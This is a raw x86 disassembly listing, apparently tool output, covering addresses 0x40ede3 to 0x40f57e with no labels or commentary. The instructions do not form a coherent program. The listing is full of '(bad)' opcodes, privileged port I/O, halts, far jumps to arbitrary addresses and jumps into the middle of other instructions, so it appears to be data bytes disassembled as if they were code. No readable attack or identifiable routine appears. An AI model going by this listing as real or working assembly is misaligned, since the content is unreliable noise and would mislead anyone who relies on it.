  40ede3:	xchg   edx,eax
  40ede4:	and    DWORD PTR [edx+0x357fe45b],ebx
  40edea:	add    dh,BYTE PTR [ebp-0x55]
  40eded:	out    dx,al
  40edee:	(bad)  
  40edef:	xor    eax,0xb98f16b1
  40edf4:	jmp    0x40ee44
  40edf6:	sub    esi,esi
  40edf8:	aad    0x1
  40edfa:	pop    ds
  40edfb:	call   0xb270:0x3a4ebed5
  40ee02:	pop    edx
  40ee03:	push   0xffffffd1
  40ee05:	loopne 0x40ede7
  40ee07:	adc    DWORD PTR [eax+0x63dda5ee],edi
  40ee0d:	and    BYTE PTR [ebp+0xd],0xcc
  40ee11:	add    dl,dh
  40ee13:	inc    ecx
  40ee14:	daa    
  40ee15:	cs mov ecx,0x98f42bb2
  40ee1b:	pop    ds
  40ee1c:	mov    esi,0x963c8641
  40ee21:	sub    eax,0xeee8465f
  40ee26:	mov    ecx,fs
  40ee28:	jle    0x40ee6f
  40ee2a:	fidiv  WORD PTR [ecx-0xf8227e9]
  40ee30:	mov    ecx,0xe769bf40
  40ee35:	lods   eax,DWORD PTR ds:[esi]
  40ee36:	mov    bh,0x3f
  40ee38:	scas   al,BYTE PTR es:[edi]
  40ee39:	loope  0x40ee9d
  40ee3b:	test   BYTE PTR [ebx],0x1f
  40ee3e:	in     eax,0xc9
  40ee40:	cmp    BYTE PTR [eax-0x71],al
  40ee43:	sbb    al,0xb0
  40ee45:	jmp    0x40edf4
  40ee47:	retf   
  40ee48:	adc    BYTE PTR [ebx+edi*1+0x4a],bh
  40ee4c:	aaa    
  40ee4d:	jmp    0xd45319ba
  40ee52:	les    esp,FWORD PTR [eax+0x3d4475eb]
  40ee58:	jecxz  0x40eea7
  40ee5a:	(bad)  
  40ee5c:	xchg   esp,eax
  40ee5d:	cmp    BYTE PTR [eax+0xef0c5eb],al
  40ee63:	or     eax,0xd8b16227
  40ee68:	xchg   esp,eax
  40ee69:	jge    0x40edf7
  40ee6b:	inc    esp
  40ee6c:	mov    ds:0x93533a8e,eax
  40ee71:	sub    dl,BYTE PTR [ebx-0x51]
  40ee74:	dec    edi
  40ee75:	jmp    0x1b32e9e0
  40ee7a:	mov    BYTE PTR [ebp-0x73],bl
  40ee7d:	call   0x369383fa
  40ee82:	and    DWORD PTR [ecx-0x7],ebp
  40ee85:	sbb    DWORD PTR [ecx],ebp
  40ee87:	lds    edi,FWORD PTR [esi+0x53]
  40ee8a:	xchg   edi,eax
  40ee8b:	js     0x40ee82
  40ee8d:	test   al,0xa3
  40ee8f:	fucomp st(7)
  40ee91:	in     eax,dx
  40ee92:	inc    ebp
  40ee93:	pop    ecx
  40ee94:	je     0x40ee42
  40ee96:	mov    WORD PTR [edx],es
  40ee98:	mov    al,ds:0x709710d9
  40ee9d:	enter  0x6840,0xf7
  40eea1:	push   ss
  40eea2:	div    DWORD PTR [eax+ecx*8+0x1f]
  40eea6:	jmp    0x40ee73
  40eea8:	fwait
  40eea9:	add    DWORD PTR [ebp-0x5b],esi
  40eeac:	icebp  
  40eead:	fwait
  40eeae:	out    dx,eax
  40eeaf:	test   BYTE PTR [eax-0x77],dh
  40eeb2:	and    ecx,DWORD PTR [esi]
  40eeb4:	imul   esp,DWORD PTR [edx+edx*1-0x36],0x43
  40eeb9:	imul   al
  40eebb:	or     ecx,DWORD PTR gs:0xb6926fee
  40eec2:	repnz seta BYTE PTR [ecx-0x31]
  40eec7:	inc    eax
  40eec8:	ffree  st(1)
  40eeca:	adc    BYTE PTR ds:[esi],al
  40eecd:	cmp    al,0x35
  40eecf:	jle    0x40eef7
  40eed1:	xlat   BYTE PTR ds:[ebx]
  40eed2:	jecxz  0x40eef9
  40eed4:	inc    eax
  40eed5:	jl     0x40eea7
  40eed7:	pushf  
  40eed8:	std    
  40eed9:	bound  eax,QWORD PTR [esi-0x68a48745]
  40eedf:	sub    DWORD PTR [ebx+0x52],eax
  40eee2:	xlat   BYTE PTR ds:[ebx]
  40eee3:	int3   
  40eee4:	sbb    DWORD PTR [edi+edx*4-0x2e],ecx
  40eee8:	adc    eax,0x264fbb96
  40eeed:	or     eax,0x281f38d4
  40eef2:	out    dx,eax
  40eef3:	mov    ecx,DWORD PTR [ebx+ebx*4+0x1c]
  40eef7:	lods   eax,DWORD PTR ds:[esi]
  40eef8:	(bad)  
  40eef9:	ds inc edi
  40eefb:	aas    
  40eefc:	jnp    0x40eeb8
  40eefe:	push   eax
  40eeff:	rcl    BYTE PTR [ebx+ecx*2-0x60],0xa9
  40ef04:	jb     0x40ef3a
  40ef06:	mov    ds:0xab0819e7,eax
  40ef0b:	mov    DWORD PTR [ecx],esp
  40ef0d:	or     BYTE PTR [edi],al
  40ef0f:	jp     0x40ef8a
  40ef11:	or     dl,bl
  40ef13:	jns    0x40eec0
  40ef15:	xor    eax,0x29df5b2d
  40ef1a:	pop    ebp
  40ef1b:	adc    bh,BYTE PTR [edx+edi*4]
  40ef1e:	pusha  
  40ef1f:	icebp  
  40ef20:	xor    al,0x88
  40ef22:	add    eax,0xac7c3aae
  40ef27:	mov    edi,0x30f1fc40
  40ef2c:	hlt    
  40ef2d:	sub    dh,BYTE PTR [ebp+eiz*2+0x6f11bc76]
  40ef34:	out    0x88,al
  40ef36:	push   ebp
  40ef37:	retf   0x86fd
  40ef3a:	inc    BYTE PTR [edx*4+0xcf9f1a5]
  40ef41:	es mov bl,0x3d
  40ef44:	cmp    eax,0xea174a61
  40ef49:	sbb    BYTE PTR [edx+ecx*8+0x74],ah
  40ef4d:	mov    ah,0xec
  40ef4f:	in     al,dx
  40ef50:	repz pop ecx
  40ef52:	and    dh,cl
  40ef54:	out    0xbe,eax
  40ef56:	ror    BYTE PTR [ebx+edi*8-0x25504b6d],1
  40ef5d:	push   es
  40ef5e:	mov    ebp,0x4159a274
  40ef63:	add    DWORD PTR [ecx+0x10],ebx
  40ef66:	in     al,dx
  40ef67:	vpunpcklwd xmm7,xmm5,XMMWORD PTR [ecx+0x177961b6]
  40ef6f:	out    dx,al
  40ef70:	mov    bl,ch
  40ef72:	dec    ebx
  40ef73:	mov    dx,0xe9a7
  40ef77:	fist   DWORD PTR [ebp-0x6e]
  40ef7a:	inc    esi
  40ef7b:	mov    al,ds:0x8de496fd
  40ef80:	or     edx,esp
  40ef82:	imul   eax,DWORD PTR [ebx+0x6a251df0],0x2d
  40ef89:	(bad)  
  40ef8b:	push   ds
  40ef8c:	jp     0x40efa4
  40ef8e:	cmc    
  40ef8f:	fmul   st(5),st
  40ef91:	test   esp,ebp
  40ef93:	popf   
  40ef94:	dec    di
  40ef96:	lock pop esi
  40ef98:	adc    al,0x6b
  40ef9a:	jle    0x40efd1
  40ef9c:	sar    cl,1
  40ef9e:	pop    ebx
  40ef9f:	(bad)  
  40efa0:	ror    BYTE PTR [ebx+0x6efe2fcd],0xda
  40efa7:	jno    0x40eff6
  40efa9:	es cdq 
  40efab:	fdiv   QWORD PTR [edi-0x31c534b6]
  40efb1:	and    ah,BYTE PTR [esi+eax*1-0x7d713dd8]
  40efb8:	pop    esi
  40efb9:	retf   0x51a1
  40efbc:	or     BYTE PTR [ebp+0x15acec19],al
  40efc2:	xchg   esi,eax
  40efc3:	or     eax,0x843ba0b7
  40efc8:	push   esi
  40efc9:	cmc    
  40efca:	lds    edi,FWORD PTR [edi-0x1]
  40efcd:	xor    ah,BYTE PTR [ecx]
  40efcf:	ins    DWORD PTR es:[edi],dx
  40efd0:	mov    edx,DWORD PTR [ebp-0x57]
  40efd3:	xchg   ebx,eax
  40efd4:	fcomp  DWORD PTR ds:0x148d767d
  40efda:	aaa    
  40efdb:	icebp  
  40efdc:	sbb    BYTE PTR [ebp+0x6a2032b6],ch
  40efe2:	cld    
  40efe3:	mov    bl,0xd
  40efe5:	sbb    edx,DWORD PTR [esi+eax*1-0x47a10e29]
  40efec:	(bad)  
  40efed:	inc    esp
  40efee:	or     al,0xcd
  40eff0:	leave  
  40eff1:	stos   DWORD PTR es:[edi],eax
  40eff2:	add    eax,0xe58179de
  40eff7:	cs mov ah,0xcc
  40effa:	int3   
  40effb:	and    dl,BYTE PTR [ebx+0x23]
  40effe:	jmp    ebx
  40f000:	ret    0xd395
  40f003:	outs   dx,BYTE PTR ds:[esi]
  40f004:	xchg   edx,eax
  40f005:	mov    edx,0x47c2d2aa
  40f00a:	jno    0x40f078
  40f00c:	retf   
  40f00d:	or     BYTE PTR [edx-0x70],dl
  40f010:	inc    esi
  40f011:	je     0x40f000
  40f013:	repz pushf 
  40f015:	inc    ecx
  40f016:	dec    edx
  40f017:	dec    ecx
  40f018:	fcmovnbe st,st(3)
  40f01a:	cmp    eax,0xb1c93b96
  40f01f:	sbb    al,0x29
  40f021:	and    DWORD PTR [ebp+0x1a5491af],edi
  40f027:	mov    bh,0x99
  40f029:	xor    BYTE PTR [ebp+0x46b47d37],bh
  40f02f:	dec    edx
  40f030:	popa   
  40f031:	pop    edx
  40f032:	jb     0x40f028
  40f034:	dec    esp
  40f035:	pop    ss
  40f036:	pop    ds
  40f037:	cmp    al,0xeb
  40f039:	mov    dl,BYTE PTR [edi]
  40f03b:	pushf  
  40f03c:	lds    edx,FWORD PTR [ebx+0x5e]
  40f03f:	jns    0x40efd0
  40f041:	jbe    0x40f089
  40f043:	shl    ebx,1
  40f045:	xchg   ecx,eax
  40f046:	popf   
  40f047:	lds    ebx,FWORD PTR [ebp+0x1c4f27a5]
  40f04d:	mov    bh,0x4f
  40f04f:	mov    eax,0x378eaa1b
  40f054:	push   esp
  40f055:	mov    edi,edx
  40f057:	push   0xffffffab
  40f059:	xlat   BYTE PTR ds:[ebx]
  40f05a:	test   ebp,esp
  40f05c:	daa    
  40f05d:	popa   
  40f05e:	dec    edx
  40f05f:	outs   dx,DWORD PTR ds:[esi]
  40f060:	sbb    al,BYTE PTR [ebx+ecx*4]
  40f063:	scas   eax,DWORD PTR es:[edi]
  40f064:	into   
  40f065:	in     eax,0x19
  40f067:	sbb    cl,bh
  40f069:	mov    eax,0x93f1e787
  40f06e:	es rcr esp,cl
  40f071:	sahf   
  40f072:	(bad)  
  40f073:	pop    esi
  40f074:	nop
  40f075:	mov    al,0x41
  40f077:	pop    ebx
  40f078:	mov    ss,WORD PTR [edx+edi*1]
  40f07b:	jo     0x40f0d5
  40f07d:	call   0xdb67d3f0
  40f082:	out    dx,al
  40f083:	push   ss
  40f084:	adc    al,0xd0
  40f086:	test   ch,dl
  40f088:	pop    eax
  40f089:	or     al,0x9
  40f08b:	inc    ebx
  40f08c:	jmp    0x7b8e0fcf
  40f091:	in     al,dx
  40f092:	adc    bl,BYTE PTR [edx]
  40f094:	xchg   esi,eax
  40f095:	std    
  40f096:	out    0xbb,eax
  40f098:	jl     0x40f089
  40f09a:	mov    DWORD PTR [edx-0x67b8bd],0xe8394a59
  40f0a4:	fistp  QWORD PTR [edx]
  40f0a6:	mov    ch,0x2b
  40f0a8:	aas    
  40f0a9:	xor    BYTE PTR [ecx+0x790b48b9],cl
  40f0af:	bnd jno 0x40f0c0
  40f0b2:	jle    0x40f12a
  40f0b4:	jb     0x40f11e
  40f0b6:	retf   
  40f0b7:	das    
  40f0b8:	jo     0x40f092
  40f0ba:	sub    BYTE PTR [ecx+0x75faa385],bh
  40f0c0:	(bad)  
  40f0c1:	fst    DWORD PTR [ebp+0x40]
  40f0c4:	mov    DWORD PTR [ebx],ebp
  40f0c6:	mov    eax,0xff8b62e4
  40f0cb:	sbb    eax,0xe689cf3a
  40f0d0:	call   0xaa182396
  40f0d5:	in     eax,dx
  40f0d6:	in     eax,dx
  40f0d7:	cli    
  40f0d8:	pop    ds
  40f0d9:	and    al,0x37
  40f0db:	ret    
  40f0dc:	mov    ecx,0xc72e5746
  40f0e1:	pop    es
  40f0e2:	cmp    cl,BYTE PTR [edi]
  40f0e4:	jmp    FWORD PTR [edi]
  40f0e6:	mov    cl,0x21
  40f0e8:	push   esp
  40f0e9:	or     BYTE PTR [edi-0x1f40c63d],al
  40f0ef:	(bad)  
  40f0f0:	not    BYTE PTR [ebx+0x59]
  40f0f3:	mov    ch,0x57
  40f0f5:	mov    eax,0x1c945235
  40f0fa:	mov    edi,0x74446cbe
  40f0ff:	mov    dl,0x30
  40f101:	dec    ebp
  40f102:	xor    eax,0x375a6e60
  40f107:	mov    gs,WORD PTR [edi*1-0x34646f06]
  40f10e:	dec    ebp
  40f10f:	aam    0xbf
  40f111:	inc    edi
  40f112:	pop    edx
  40f113:	adc    al,0x70
  40f115:	dec    edx
  40f116:	scas   eax,DWORD PTR es:[edi]
  40f117:	rol    cl,1
  40f119:	addr16 push ds
  40f11b:	hlt    
  40f11c:	xor    DWORD PTR [ebx+0x5d670ef0],0x1d
  40f123:	sub    BYTE PTR [edx+edx*1],bh
  40f126:	add    al,0x39
  40f128:	clc    
  40f129:	and    BYTE PTR [edi-0x5ab423a],cl
  40f12f:	pop    edx
  40f130:	push   0x67
  40f132:	aam    0x5b
  40f134:	add    ah,cl
  40f136:	les    edi,FWORD PTR [edi+0x42]
  40f139:	hlt    
  40f13a:	icebp  
  40f13b:	out    0x5a,al
  40f13d:	mov    cl,0xd3
  40f13f:	stos   BYTE PTR es:[edi],al
  40f140:	aad    0xa5
  40f142:	and    BYTE PTR [ecx+0x7132bb18],ah
  40f148:	aas    
  40f149:	or     al,0x1e
  40f14b:	dec    esp
  40f14c:	pop    ebx
  40f14d:	mov    ch,BYTE PTR [ebp+0x7e]
  40f150:	cmp    edx,edx
  40f152:	loope  0x40f0f1
  40f154:	ja     0x40f108
  40f156:	xchg   esi,eax
  40f157:	fiadd  WORD PTR [ebx+0x21]
  40f15a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f15b:	sti    
  40f15c:	imul   esp,DWORD PTR [ebx+0x7b48abeb],0x26d83a45
  40f166:	inc    BYTE PTR [eax]
  40f168:	lods   al,BYTE PTR ds:[esi]
  40f169:	mov    bl,dl
  40f16b:	mov    dh,0x90
  40f16d:	add    eax,0x1a6b2103
  40f172:	mov    eax,ds:0xda0458f5
  40f177:	push   edx
  40f178:	mov    ds:0x4a95c177,al
  40f17d:	(bad)  
  40f17e:	ret    
  40f17f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f180:	ss enter 0x4ab9,0xd8
  40f185:	lds    edx,FWORD PTR [ebp+0xeaf7cc1]
  40f18b:	stos   DWORD PTR es:[edi],eax
  40f18c:	xlat   BYTE PTR ds:[ebx]
  40f18d:	mov    esp,0x2abcaa91
  40f192:	xor    eax,DWORD PTR [eax]
  40f194:	dec    ebx
  40f195:	repnz sahf 
  40f197:	retf   0xca46
  40f19a:	bt     eax,ebp
  40f19d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f19e:	fmul   DWORD PTR [esi-0x609df8d]
  40f1a4:	js     0x40f21a
  40f1a6:	ins    BYTE PTR es:[edi],dx
  40f1a7:	xor    DWORD PTR [ebp-0xb],edx
  40f1aa:	mov    esp,0xdfcafe54
  40f1af:	popa   
  40f1b0:	rol    BYTE PTR [ecx],cl
  40f1b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f1b3:	jmp    0x40f163
  40f1b5:	dec    edx
  40f1b6:	adc    DWORD PTR [edx],edi
  40f1b8:	ss (bad) 
  40f1ba:	mov    dl,0x3e
  40f1bc:	loopne 0x40f231
  40f1be:	aad    0xfc
  40f1c0:	sub    eax,0xe25bdddd
  40f1c5:	adc    BYTE PTR [esi-0x309dc45],bl
  40f1cb:	clc    
  40f1cc:	mov    ch,0x62
  40f1ce:	aaa    
  40f1cf:	daa    
  40f1d0:	mov    ds:0xc21aa1fb,eax
  40f1d5:	inc    ecx
  40f1d6:	(bad)  
  40f1d7:	cmc    
  40f1d8:	stos   DWORD PTR es:[edi],eax
  40f1d9:	call   0x2a708e9e
  40f1de:	shl    BYTE PTR ds:0x3b454fe7,1
  40f1e4:	test   DWORD PTR [esi+0x52],0x93cd79c9
  40f1eb:	mov    ebp,0xbd0a2176
  40f1f0:	mov    esi,0x814c1fb9
  40f1f5:	or     BYTE PTR [eax-0x3e36b714],al
  40f1fb:	or     eax,edx
  40f1fd:	(bad)  
  40f1fe:	sti    
  40f1ff:	mov    ebp,0x48aa8cc
  40f204:	mov    ch,ah
  40f206:	pop    ss
  40f207:	ror    edi,0xe8
  40f20a:	or     eax,0x110ac2d9
  40f20f:	dec    ebx
  40f210:	lock cmp dh,ch
  40f213:	add    DWORD PTR [ebx+eiz*4],ebp
  40f216:	cmp    al,0x8a
  40f218:	iret   
  40f219:	add    DWORD PTR [edx-0x2bf58b42],0xe6a71cf8
  40f223:	add    BYTE PTR [ebp-0x6e],al
  40f226:	mov    ds:0x710af647,al
  40f22b:	pop    ds
  40f22c:	js     0x40f1f9
  40f22e:	xchg   esi,eax
  40f22f:	or     eax,0xcc68afe6
  40f234:	hlt    
  40f235:	stc    
  40f236:	inc    edx
  40f237:	outs   dx,DWORD PTR ds:[esi]
  40f238:	add    al,0x1a
  40f23a:	cmp    al,0x7a
  40f23c:	inc    eax
  40f23d:	and    edx,DWORD PTR [ecx-0x13d4b43b]
  40f243:	jmp    0x484202b1
  40f248:	ficom  DWORD PTR [edi+esi*4+0x40]
  40f24c:	xor    eax,0xcbec906f
  40f251:	repz (bad) 
  40f253:	test   edi,0xc1ae4302
  40f259:	fiadd  WORD PTR [edx+0x4a]
  40f25c:	mov    ds:0xe5f97e5,al
  40f261:	mov    cl,0x58
  40f263:	sbb    al,BYTE PTR [ebx]
  40f265:	mov    ah,0x20
  40f267:	mov    ds:0x2cb78f92,eax
  40f26c:	jmp    0xaf33ddbb
  40f271:	lods   eax,DWORD PTR ds:[esi]
  40f272:	mov    al,0xa9
  40f274:	in     eax,dx
  40f275:	mov    ebp,0xc2e14efb
  40f27a:	iret   
  40f27b:	ret    0xfa55
  40f27e:	push   edi
  40f27f:	fisubr DWORD PTR [edi+ebp*2]
  40f282:	mov    ds:0xf66641b0,al
  40f287:	adc    bl,BYTE PTR [edi]
  40f289:	pop    ss
  40f28a:	js     0x40f225
  40f28c:	imul   edx,ebx,0x3cdc77bd
  40f292:	in     al,dx
  40f293:	not    DWORD PTR [ebx]
  40f295:	retf   
  40f296:	loopne 0x40f2d5
  40f298:	js     0x40f2ab
  40f29a:	pop    edi
  40f29b:	cmp    cl,BYTE PTR [eax-0x42]
  40f29e:	jmp    0xc9f8:0x6e8ba01b
  40f2a5:	(bad)  
  40f2a6:	mov    edx,0xbece146
  40f2ab:	fldcw  WORD PTR [ecx]
  40f2ad:	cwde   
  40f2ae:	dec    eax
  40f2af:	aam    0xdf
  40f2b1:	sbb    eax,0xb164e87b
  40f2b6:	int3   
  40f2b7:	sar    ebp,1
  40f2b9:	lea    ebp,[ebp-0x73]
  40f2bc:	ret    0x6bf0
  40f2bf:	mov    bh,0xfb
  40f2c1:	push   edi
  40f2c2:	loope  0x40f2b5
  40f2c4:	stos   DWORD PTR es:[edi],eax
  40f2c5:	aam    0x74
  40f2c7:	pop    ebp
  40f2c8:	out    dx,al
  40f2c9:	mov    WORD PTR [eax],ds
  40f2cb:	mov    ebx,0xdea90e92
  40f2d0:	inc    esi
  40f2d1:	inc    edx
  40f2d2:	jl     0x40f316
  40f2d4:	sub    eax,0x4de1f583
  40f2d9:	mov    bh,0xa0
  40f2db:	add    al,0xed
  40f2dd:	mov    BYTE PTR [ecx],0xc2
  40f2e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2e1:	or     ebx,DWORD PTR [ecx-0x2f]
  40f2e4:	shr    edx,cl
  40f2e6:	push   esi
  40f2e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2e8:	mov    eax,0x2ba40450
  40f2ed:	push   ebx
  40f2ee:	sbb    BYTE PTR [esi-0x6b],cl
  40f2f1:	mov    al,gs:0x75c6345
  40f2f7:	ja     0x40f28f
  40f2f9:	mov    ds:0x87f47e22,eax
  40f2fe:	mov    edx,DWORD PTR ss:[edi+edx*2-0x765dcf06]
  40f306:	mov    edx,0x987c779b
  40f30b:	push   cs
  40f30c:	or     ecx,DWORD PTR [ebp+ebp*2+0x7d4d210c]
  40f313:	or     BYTE PTR [ecx+0x3a8870a5],0x15
  40f31a:	xor    al,0xa2
  40f31c:	or     BYTE PTR [ebx-0x80],cl
  40f31f:	mov    WORD PTR [eax+0x581ac0b3],?
  40f325:	out    dx,eax
  40f326:	push   edi
  40f327:	mov    edi,0x1daff79a
  40f32c:	jns    0x40f3a4
  40f32e:	nop
  40f32f:	stos   DWORD PTR es:[edi],eax
  40f330:	push   ecx
  40f331:	cli    
  40f332:	mov    dl,0xa0
  40f334:	popf   
  40f335:	pusha  
  40f336:	adc    DWORD PTR [ebx-0xa],0xd765c064
  40f33d:	(bad)  
  40f33e:	fwait
  40f33f:	jmpw   0xcfab
  40f343:	out    dx,eax
  40f344:	(bad)  
  40f345:	retf   0x5307
  40f348:	dec    ebp
  40f349:	ret    
  40f34a:	in     al,dx
  40f34b:	add    DWORD PTR ds:0xb39400d6,ecx
  40f351:	not    ebp
  40f353:	test   eax,0x1e353022
  40f358:	and    al,0x62
  40f35a:	or     al,0x9a
  40f35c:	nop
  40f35d:	iret   
  40f35e:	or     eax,0x33806cad
  40f363:	fst    QWORD PTR [edx+0x6edf1017]
  40f369:	push   0x28a37cd7
  40f36e:	lea    ecx,[edi]
  40f370:	div    BYTE PTR [ecx]
  40f372:	push   ebx
  40f373:	mov    edi,0x76949da8
  40f378:	or     bh,BYTE PTR [ecx+0x5824af38]
  40f37e:	jmp    0x40f315
  40f380:	mov    bl,0xf6
  40f382:	pop    es
  40f383:	xchg   edx,eax
  40f384:	mov    al,ds:0x190b3ad2
  40f389:	dec    esp
  40f38a:	jnp    0x40f331
  40f38c:	daa    
  40f38d:	xor    eax,0x3cb02415
  40f392:	xchg   edx,eax
  40f393:	jge    0x40f3c6
  40f395:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f396:	sub    eax,0x8383a157
  40f39b:	mov    al,ds:0x92ef0e58
  40f3a0:	cmp    al,0x1e
  40f3a2:	mov    ebx,0xcb0edcf
  40f3a7:	fs jnp 0x40f3aa
  40f3aa:	out    dx,al
  40f3ab:	hlt    
  40f3ac:	xor    esp,eax
  40f3ae:	scas   eax,DWORD PTR es:[edi]
  40f3af:	push   ecx
  40f3b0:	add    eax,ebp
  40f3b2:	adc    eax,DWORD PTR [edi+0x33]
  40f3b5:	iret   
  40f3b6:	loope  0x40f378
  40f3b8:	loopne 0x40f3eb
  40f3ba:	add    eax,0x78d5d058
  40f3bf:	mov    cl,0x42
  40f3c1:	mov    ebx,0x5b86bddb
  40f3c6:	add    bh,BYTE PTR [edx+0x515506ef]
  40f3cc:	inc    ebp
  40f3cd:	sub    al,0xf2
  40f3cf:	mov    edi,0xd50a5771
  40f3d4:	inc    eax
  40f3d5:	fld    DWORD PTR [ebx-0x410ed8f0]
  40f3db:	into   
  40f3dc:	dec    esp
  40f3dd:	mov    cl,0x4b
  40f3df:	push   eax
  40f3e0:	sub    BYTE PTR ds:[ebp-0x3c],dl
  40f3e4:	cmp    DWORD PTR [bx],0xffffffcf
  40f3e8:	jo     0x40f3a1
  40f3ea:	pop    edi
  40f3eb:	out    0x1b,eax
  40f3ed:	ins    BYTE PTR es:[edi],dx
  40f3ee:	dec    edi
  40f3ef:	retf   
  40f3f0:	dec    eax
  40f3f1:	fwait
  40f3f2:	call   0x9869:0x9081323b
  40f3f9:	cmp    DWORD PTR [ebp+ebx*4+0x14ca1437],ebp
  40f400:	call   0x8a43b508
  40f405:	xchg   edi,eax
  40f406:	mov    edx,0x8eab6112
  40f40b:	pop    es
  40f40c:	jnp    0x40f44f
  40f40e:	push   edi
  40f40f:	push   ss
  40f410:	dec    eax
  40f411:	sub    ebp,DWORD PTR [ebp+esi*4+0x61fe1858]
  40f418:	pusha  
  40f419:	call   0x59b54424
  40f41e:	xchg   BYTE PTR [ebp+0x4917d1bc],al
  40f424:	mov    cs,WORD PTR [eax-0x6fc4fdbc]
  40f42a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f42b:	fidiv  WORD PTR [eax*2+0x636768d0]
  40f432:	std    
  40f433:	fimul  WORD PTR [edi-0x5c]
  40f436:	retf   
  40f437:	cmp    DWORD PTR [edx+0x53],ecx
  40f43a:	adc    eax,0xf6bbdd32
  40f43f:	inc    ecx
  40f440:	daa    
  40f441:	popf   
  40f442:	jmp    0xdc0e:0xb7e47430
  40f449:	cld    
  40f44a:	xor    al,0x81
  40f44c:	stos   DWORD PTR es:[edi],eax
  40f44d:	or     ebx,eax
  40f44f:	loope  0x40f47c
  40f451:	push   edi
  40f452:	mov    bl,0x62
  40f454:	ins    DWORD PTR es:[edi],dx
  40f455:	jns    0x40f46a
  40f457:	ret    
  40f458:	clc    
  40f459:	arpl   WORD PTR [eax],dx
  40f45b:	aas    
  40f45c:	ror    BYTE PTR ds:0xa5032252,cl
  40f462:	lods   al,BYTE PTR ds:[esi]
  40f463:	in     al,dx
  40f464:	jae    0x40f431
  40f466:	inc    edx
  40f467:	mov    ch,cl
  40f469:	clc    
  40f46a:	xchg   ebx,eax
  40f46b:	or     eax,0x5c860aa2
  40f470:	inc    edi
  40f471:	add    eax,0xd469cad7
  40f476:	pop    ebx
  40f477:	ret    0xa51a
  40f47a:	push   eax
  40f47b:	mov    ch,0xa2
  40f47d:	jo     0x40f40d
  40f47f:	aas    
  40f480:	jge    0x40f436
  40f482:	jp     0x40f40a
  40f484:	add    DWORD PTR ds:0x1000d046,0xffffff85
  40f48b:	lahf   
  40f48c:	and    cl,BYTE PTR [ebx+0x49]
  40f48f:	scas   eax,DWORD PTR es:[edi]
  40f490:	push   ds
  40f491:	jp     0x40f4b3
  40f493:	inc    ebx
  40f494:	das    
  40f495:	push   ss
  40f496:	mov    esi,0x1e4aa156
  40f49b:	in     eax,dx
  40f49c:	jns    0x40f4f9
  40f49e:	add    eax,eax
  40f4a0:	lea    edx,[ebx+0x3d84a014]
  40f4a6:	or     eax,0x8e2f64f5
  40f4ab:	imul   esi,DWORD PTR [eax-0x5d],0x2b89bfe4
  40f4b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4b3:	add    DWORD PTR [edx-0x3a],0x74
  40f4b7:	cmp    eax,0xb0998ee2
  40f4bc:	or     al,bl
  40f4be:	jp     0x40f526
  40f4c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4c1:	js     0x40f44b
  40f4c3:	fcom   st(7)
  40f4c5:	push   0xddec0c88
  40f4ca:	mov    esi,DWORD PTR [ebx+0x19]
  40f4cd:	fstp   QWORD PTR [eax-0x4a]
  40f4d0:	adc    BYTE PTR ds:0xf71f4442,cl
  40f4d6:	mov    esi,0x390d159
  40f4db:	xchg   DWORD PTR [edx-0x6b],ecx
  40f4de:	fcomip st,st(4)
  40f4e0:	imul   esp,DWORD PTR [ebp+0x4c],0x6c
  40f4e4:	hlt    
  40f4e5:	jecxz  0x40f47c
  40f4e7:	lods   eax,DWORD PTR ds:[esi]
  40f4e8:	iret   
  40f4e9:	mov    ebp,0xca13cf61
  40f4ee:	xor    BYTE PTR [ebx-0x3d],bl
  40f4f1:	test   al,0x49
  40f4f3:	xchg   edx,eax
  40f4f4:	std    
  40f4f5:	out    dx,eax
  40f4f6:	ins    DWORD PTR es:[edi],dx
  40f4f7:	stos   BYTE PTR es:[edi],al
  40f4f8:	(bad)  
  40f4f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4fa:	or     dl,ah
  40f4fc:	or     cl,al
  40f4fe:	retf   
  40f4ff:	repnz sub eax,0xeca69a1f
  40f505:	pop    edi
  40f506:	cmp    edi,DWORD PTR [ecx+0x21]
  40f509:	cli    
  40f50a:	xor    ch,0x5d
  40f50d:	sub    BYTE PTR [ebx+0x73],dl
  40f510:	mov    DWORD PTR [esi+0x65],ebx
  40f513:	(bad)  
  40f514:	scas   al,BYTE PTR es:[edi]
  40f515:	iret   
  40f516:	inc    esp
  40f517:	lods   al,BYTE PTR ds:[esi]
  40f518:	shr    BYTE PTR [eax-0x5d],cl
  40f51b:	push   edi
  40f51c:	daa    
  40f51d:	cmp    cl,BYTE PTR [edx+0x28e89104]
  40f523:	in     eax,0x57
  40f525:	and    DWORD PTR [edx-0x58887bd0],ebx
  40f52b:	(bad)  
  40f52c:	pop    esp
  40f52d:	xor    bl,BYTE PTR [ebx-0x28]
  40f530:	retf   0x6419
  40f533:	out    dx,eax
  40f534:	outs   dx,DWORD PTR ds:[esi]
  40f535:	xchg   BYTE PTR [ebx-0x76],cl
  40f538:	(bad)  
  40f539:	push   esi
  40f53a:	sar    DWORD PTR [edx+ebx*1],0xe1
  40f53e:	data16 sbb BYTE PTR [edx-0x1e],0x6c
  40f543:	mov    al,0x8c
  40f545:	inc    esp
  40f546:	mov    dl,0x6b
  40f548:	lea    esi,[ebp-0x78]
  40f54b:	mov    al,ds:0xb4d7b04a
  40f550:	push   ds
  40f551:	xlat   BYTE PTR ds:[ebx]
  40f552:	inc    edi
  40f553:	mov    DWORD PTR [esp+eax*2+0x30],esi
  40f557:	gs ds call 0x1083:0xb45007e5
  40f560:	dec    ebp
  40f561:	cmp    esi,esi
  40f563:	push   ss
  40f564:	rol    DWORD PTR [ecx],1
  40f566:	xchg   BYTE PTR [ebp-0x22cf4984],cl
  40f56c:	mov    al,fs:0xffbcec74
  40f572:	out    0xcf,al
  40f574:	(bad)  
  40f575:	xlat   BYTE PTR ds:[ebx]
  40f576:	xor    cl,cl
  40f578:	jno    0x40f57e
  40f57a:	or     eax,DWORD PTR es:[ecx]
  40f57d:	dec    edx
  40f57e:	popa   
